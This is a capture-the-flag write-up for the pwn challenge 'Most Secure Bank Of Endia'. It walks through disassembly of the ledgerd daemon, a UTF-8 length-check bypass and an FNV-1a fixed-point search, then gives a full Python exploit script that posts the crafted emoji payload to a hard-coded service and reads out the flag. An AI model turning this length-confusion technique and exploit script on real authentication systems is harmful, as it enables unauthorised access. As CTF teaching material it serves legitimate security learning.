---
title: "Most Secure Bank Of Endia"
category: "Pwn"
tags: ["utf-8-encoding", "length-limit-confusion", "canary", "fnv-1a", "fixed-point"]
solve_date: "2026-10-10T10:35:00+07:00"
language: "en"
points: 271
---

# Most Secure Bank Of Endia

**Flag** (read from the daemon's stdout on the service; **no submission response was recorded**):

```text
kBxAc{___h4ck1ng_b4nk_m41nfr4m3_w1th_3m0j15_1n_b1g_2026_w1th_0ps3*_l3v3l_🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃___}
```

**Input:** handout containing `app/app.py`, `app/templates/index.html`, `bin/ledgerd`, `Dockerfile`, `requirements.txt`; HTTP service at `http://35.254.226.167:5000`. `ledgerd` is an x86-64 ELF, dynamically linked, non-PIE, stripped.

## Challenge

`POST /api/vault/auth` takes `user` and `pass`, builds the frame `f"{user}|{pass}\n"` and feeds it to the stdin of `ledgerd`. The response only reports success when the daemon's stdout contains `VAULT SEAL INTEGRITY VERIFIED`.

Server-side constraints in `app.py`:

- `MAX_FIELD_LEN = 16`, enforced through `len(value) > 16`.
- `value.isprintable()` — every character must be printable by the Unicode definition.
- Blacklist regex over `user + pass`: `'`, `--`, `\bunion\b`, `\bor\b\s+\d+=\d+`.
- Rate limit of 10 requests per 10 seconds per IP.

`/admin` and `robots.txt` are decoys: `/admin` always returns 403 and no route in the application reads `session["role"]`, so there is no web-side authentication bypass. The only gate is the logic inside `ledgerd`.

## Analysis

### ledgerd has no overflow

`main` at `0x4011c0` builds a `sub rsp, 0x170` frame, places the input buffer at `rsp+0xd0` and zeroes exactly 160 bytes:

```asm
0x004011fe  lea rcx, [rsp + 0xd0]        ; buf
0x0040120a  mov esi, 0x80                ; 128
...
0x0040123f  add rcx, rax                 ; 0xd0 + 0x80 = 0x150
0x00401242  movaps [rcx], xmm0           ; zeroing continues up to rsp+0x16f
0x00401249  mov dword [rsp + 0x118], 0x13371337
```

The `fgets` write window is exactly the size of the buffer, so the frame cannot reach the return address:

```asm
0x00401260  lea rdi, [rsp + 0xd0]
0x0040126f  mov esi, 0xa0                ; 160
0x00401274  call fgets
0x0040128a  lea rsi, 0x40216d            ; "\n"
0x00401294  call strcspn
0x00401299  mov byte [rsp + rax + 0xd0], 0
```

This is therefore not a memory corruption task: unlocking requires satisfying three integrity checks evaluated over `buf`.

### The three checks

| Check | Address | Requirement |
|---|---|---|
| Canary | `0x401324` | `dword [buf+0x48] == 0x5A434288`, i.e. bytes `88 42 43 5A` |
| Hex field | `0x4013c6` | `buf[0x4c..0x4f]` are four hex characters (`0-9`, `a-f`), accumulated into `ecx` |
| Hash | `0x4013db` | `(FNV1a32(buf[0x00..0x4f]) & 0xFFFF) ^ 0x1998 == ecx` |

The FNV loop runs over a **fixed 80 bytes**, independent of the string length:

```asm
0x00401335  lea rdi, [rsp + 0xd0]        ; start = buf
0x0040133d  lea rsi, [rsp + 0x120]       ; end   = buf + 0x50
0x00401348  mov eax, 0x811c9dc5          ; offset basis
0x00401360  movzx ecx, byte [rdx]
0x00401363  xor eax, ecx
0x00401365  imul eax, eax, 0x1000193     ; prime
0x0040136f  cmp rdx, rsi
0x00401372  jne 0x401360
```

The hex parser iterates four times over `[rdi+0x4c]` (`lea r8, [rdi + 4]`) and rejects any byte that is not `0-9` or `a-f`; then:

```asm
0x004013db  xor ax, 0x1998
0x004013df  cmp cx, ax
0x004013e2  je 0x401417                  ; branch that reads /flag.txt
```

The success branch calls `fopen("/flag.txt","r")` (fallback `flag.txt`), reads it with `fgets` into a 128-byte area and prints `Recovery key: %s`.

### 16 characters are not 16 bytes

`MAX_FIELD_LEN` is applied to `len(str)`, which counts **code points**, not UTF-8 bytes. `subprocess.run(..., input=frame, text=True, encoding="utf-8")` writes the frame as UTF-8, so 16 four-byte emoji characters produce 64 bytes for the `user` field. This encoding permits placing data at offset `0x48` (72) while keeping each field at 16 characters.

The `0x88` byte the canary needs sits at offset 72. In UTF-8, `0x88` can only appear as a continuation byte (`10xxxxxx`), and it is the last byte of `😈` (U+1F608 = `F0 9F 98 88`). The remaining three bytes `42 43 5A` are the ASCII string `BCZ`.

The four hex characters at offsets 76..79 are themselves **part of the hashed range** that they are compared against, so a **fixed point** must be found:

```
int(h4, 16) == (FNV1a32(prefix76 + h4) ^ 0x1998) & 0xFFFF
```

The search covers 2^16 candidate values. Not every layout has a solution (the number of solutions depends on the prefix); if the current prefix has none, change the contents of the `user` field.

### Layout used

`idx('|')` selects the copy branch: `cmp rax, 0x3f` at `0x40131e`. With a 64-byte `user`, `idx = 64`, so `rep movsb` is skipped and no response reveals what the daemon actually received. Choosing `user` = **63 bytes / 16 characters** (15 × `😀` + `€`) gives `idx = 63`, the 63-byte copy is produced and the `AUTH-DENY user="..."` line prints **exactly the bytes the daemon received** — enough to confirm the frame survived the intervening proxy before trusting an unlock result.

| Offset | Bytes | Source |
|---|---|---|
| 0..62 | `F0 9F 98 80` ×15 + `E2 82 AC` | `user` (16 characters, 63 bytes) |
| 63 | `7C` | frame separator |
| 64..68 | `41 41 41 41 41` | `pass[0..4]` = `AAAAA` |
| 69..72 | `F0 9F 98 88` | `pass[5]` = `😈` → the `0x88` lands at offset 72 |
| 73..75 | `42 43 5A` | `BCZ` |
| 76..79 | `39 38 66 31` | `98f1` — fixed point of this prefix |

The complete frame is 81 bytes (80 bytes of data plus `\n`). The hex value depends on all 76 preceding bytes, so changing `user` or `pass[0..11]` requires recomputation.

## Solution

```python
#!/usr/bin/env python3
"""BOE ledgerd: UTF-8 length confusion + FNV-1a fixed point."""
import json
import urllib.error
import urllib.request

URL = "http://35.254.226.167:5000"
USER = "\U0001F600" * 15 + "\u20AC"          # 16 chars = 63 bytes, idx('|') == 63
PASS_PREFIX = "AAAAA" + "\U0001F608" + "BCZ"  # the 0x88 byte lands at offset 72


def fnv1a32(data):
    h = 0x811C9DC5
    for b in data:
        h = ((h ^ b) * 0x01000193) & 0xFFFFFFFF
    return h


def fixed_point(prefix):
    assert len(prefix) == 76, len(prefix)
    for v in range(0x10000):
        h4 = "%04x" % v
        if (fnv1a32(prefix + h4.encode()) ^ 0x1998) & 0xFFFF == v:
            return h4
    raise SystemExit("prefix has no fixed point - change the user field")


def unlock(url=URL):
    h4 = fixed_point(USER.encode() + b"|" + PASS_PREFIX.encode())
    pw = PASS_PREFIX + h4
    body = json.dumps({"user": USER, "pass": pw}).encode()
    req = urllib.request.Request(url.rstrip("/") + "/api/vault/auth", data=body,
                                 headers={"Content-Type": "application/json"},
                                 method="POST")
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            data = json.loads(r.read().decode("utf-8", "replace"))
    except urllib.error.HTTPError as e:
        raise SystemExit("HTTP %s: %s" % (e.code, e.read().decode("utf-8", "replace")))
    ledger = data.get("ledger") or data.get("error") or ""
    if not data.get("ok"):
        print(ledger)
        raise SystemExit("daemon refused - re-check the offsets")
    return ledger, ledger.split("Recovery key: ", 1)[1].strip()


if __name__ == "__main__":
    import sys
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="backslashreplace")
    ledger, flag = unlock(sys.argv[1] if len(sys.argv) > 1 else URL)
    print(ledger)
    print("\nFLAG:", flag)
```

Actual output when run (kept verbatim, including the 11 U+1FAC3 characters):

```text
ledgerd/3.2 (BOE branch build) ready
+------------------------------------------------+
|   VAULT SEAL INTEGRITY VERIFIED -- UNLOCKED    |
+------------------------------------------------+
[LEDGERD] Master vault opened. Recovery key: kBxAc{___h4ck1ng_b4nk_m41nfr4m3_w1th_3m0j15_1n_b1g_2026_w1th_0ps3*_l3v3l_🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃___}
```

## Result

```text
kBxAc{___h4ck1ng_b4nk_m41nfr4m3_w1th_3m0j15_1n_b1g_2026_w1th_0ps3*_l3v3l_🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃___}
```

The flag is 88 characters / 121 UTF-8 bytes, with the trailing sequence repeated 11 times as U+1FAC3; it fits well inside the daemon's `fgets(buf, 128)` limit, so nothing was truncated. The 63-byte layout above unlocked the vault on **6 of 6 consecutive sends** and returned byte-identical strings each time; this is a flag read from the remote service, and no `/submit` response was recorded.

The variant `user = 16 × 😀` (64 bytes, `idx = 64`) unlocked on the first send but returned `AUTH-DENY` on three later sends with an identical payload. That layout does not trigger the `rep movsb` copy, so there is no echo channel to inspect the bytes actually received, and the cause of the disagreement remains undetermined; the 63-byte payload is kept as the reproducible version.

## Reproduce

Requires Python 3.9+ (standard library only) and a reachable service. Save the fenced block in *Solution* as `solve_boe.py`:

```powershell
python solve_boe.py
```

To verify the offsets and the checks directly against the binary (Radare2):

```powershell
r2 -q -e scr.color=0 -e bin.relocs.apply=true -c "aaa; pdf@0x004011c0" bin/ledgerd
```

The fixed point can also be checked offline without contacting the service: run `fixed_point()` over the 76-byte prefix and compare against `98f1`. Note the 10 requests / 10 seconds rate limit when trying several prefixes — keep roughly 1.2 seconds between requests.
